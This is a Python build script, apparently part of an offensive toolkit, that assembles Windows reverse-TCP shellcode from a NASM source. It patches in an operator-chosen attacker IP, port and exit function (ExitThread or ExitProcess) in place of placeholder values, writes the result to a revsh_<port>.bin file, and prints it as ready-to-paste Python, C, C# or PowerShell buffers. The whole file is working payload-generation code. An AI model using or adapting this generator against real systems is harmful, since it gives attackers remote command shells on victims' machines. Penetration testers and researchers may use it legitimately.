#!/usr/bin/env python3

import os
import sys
import time
from subprocess import Popen
from struct import pack

if os.path.exists("./bin/") is False:
    os.mkdir("./bin/")


def clean(dir="./bin/"):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if name[-4:] == ".bin":
                os.remove(os.path.join(root, name))


def locate(src_file, dir="./src/"):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if src_file == name:
                return root
    return None


def build(name):
    location = locate("%s.asm" % name)
    if location:
        input = os.path.normpath(os.path.join(location, name))
        output = os.path.normpath(os.path.join("./bin/", name))
        p = Popen(["nasm", "-f bin", "-O3", "-o %s.bin" % output, "%s.asm" % input])
        p.wait()
        xmit(name)
    else:
        print("[-] Unable to locate '%s.asm' in the src directory" % name)


def format_hex(data):
    return ", ".join(["0x%02x" % x for x in data])


def xmit_dump_python(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes_chunk = data[i : i + length]
        hex_values = "".join(f"\\x{byte:02X}" for byte in bytes_chunk)
        dump += f"{hex_values}"
    print(f'buf = "{dump}"')


def xmit_dump_c(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "    %s\n" % (hex_values)
    print("unsigned char buf[] = {\n" + dump + "};\n")


def xmit_dump_csharp(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "        %s\n" % (hex_values)
    print("static byte[] buf = new byte[]\n    {\n" + dump + "    };")


def xmit_dump_powershell(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "    %s\n" % (hex_values)
    print("$buf = @(" + dump + ")")


def xmit_offset(data, name, value):
    offset = data.find(value)
    if offset != -1:
        print("# %s Offset: %d" % (name, offset))


def xmit(name, dump_c=True):
    bin = os.path.normpath(os.path.join("./bin/", "%s.bin" % name))
    with open(bin, "rb") as f:
        data = f.read()
    print("# Name: %s\n# Length: %d bytes" % (name, len(data)))
    xmit_offset(data, "Port", pack(">H", 4444))  # 4444
    xmit_offset(data, "Host", pack(">L", 0x7F000001))  # 127.0.0.1
    xmit_offset(data, "ExitFunk", pack("<L", 0x0A2A1DE0))  # kernel32.dll!ExitThread
    xmit_offset(data, "ExitFunk", pack("<L", 0x56A2B5F0))  # kernel32.dll!ExitProcess
    xmit_offset(
        data, "ExitFunk", pack("<L", 0xEA320EFE)
    )  # kernel32.dll!SetUnhandledExceptionFilter
    xmit_offset(data, "ExitFunk", pack("<L", 0xE035F044))  # kernel32.dll!Sleep
    if dump_c:
        print()
        xmit_dump_python(data)


def ip_to_hex(ip):
    parts = ip.split(".")
    return (
        int(parts[0]) << 24 | int(parts[1]) << 16 | int(parts[2]) << 8 | int(parts[3])
    )


def generate_shellcode(ip, port, exit_type="thread"):
    build("shell_reverse_tcp")

    bin_path = os.path.normpath(os.path.join("./bin/", "shell_reverse_tcp.bin"))
    with open(bin_path, "rb") as f:
        data = bytearray(f.read())

    port_bytes = pack(">H", int(port))
    port_offset = data.find(pack(">H", 4444))
    if port_offset != -1:
        data[port_offset : port_offset + 2] = port_bytes
    else:
        print("[-] Port offset not found")

    ip_bytes = pack(">I", ip_to_hex(ip))
    ip_offset = data.find(pack(">I", 0x7F000001))
    if ip_offset != -1:
        data[ip_offset : ip_offset + 4] = ip_bytes
    else:
        print("[-] IP offset not found")

    if exit_type.lower() == "process":
        exit_func = pack("<L", 0x56A2B5F0)  # kernel32.dll!ExitProcess
        func_name = "ExitProcess"
    else:  # thread by default
        exit_func = pack("<L", 0x0A2A1DE0)  # kernel32.dll!ExitThread
        func_name = "ExitThread"

    possible_exits = [
        pack("<L", 0x0A2A1DE0),  # ExitThread
        pack("<L", 0x56A2B5F0),  # ExitProcess
        pack("<L", 0xEA320EFE),  # SetUnhandledExceptionFilter
        pack("<L", 0xE035F044),  # Sleep
    ]

    exit_offset = -1
    for exit_pattern in possible_exits:
        exit_offset = data.find(exit_pattern)
        if exit_offset != -1:
            break

    if exit_offset != -1:
        data[exit_offset : exit_offset + 4] = exit_func
    else:
        print("[-] ExitFunc offset not found")

    output_path = os.path.join(os.path.dirname(__file__), f"revsh_{port}.bin")
    with open(output_path, "wb") as f:
        f.write(data)

    print(f"\n[+] Shellcode generated: {output_path}")
    print(f"[+] Size: {len(data)} bytes")
    print(f"[+] IP: {ip}")
    print(f"[+] Port: {port}")
    print(f"[+] ExitFunc: {func_name}")


def main(argv=None):
    if not argv:
        argv = sys.argv
    if len(argv) == 1:
        print("Usage: build.py [clean|build|gen]")
        print("  clean                              - Clean .bin files")
        print("  build                              - Build shell_reverse_tcp")
        print("  gen <ip> <port> [thread|process]   - Generate revsh_<port>.bin")
    else:
        if argv[1] == "clean":
            clean()
        elif argv[1] == "build":
            print("# Built on %s\n" % (time.asctime(time.localtime())))
            build("shell_reverse_tcp")
        elif argv[1] == "gen":
            if len(argv) < 4:
                print("Error: gen requires at least IP and port")
                print("Usage: build.py gen <ip> <port> [thread|process]")
                sys.exit(1)

            ip = argv[2]
            port = argv[3]
            exit_type = argv[4] if len(argv) > 4 else "thread"

            if exit_type not in ["thread", "process"]:
                print(f"Error: type must be 'thread' or 'process', not '{exit_type}'")
                sys.exit(1)

            print("# Built on %s\n" % (time.asctime(time.localtime())))
            generate_shellcode(ip, port, exit_type)
        else:
            print(f"Error: '{argv[1]}' is not a valid option.")


if __name__ == "__main__":
    main()
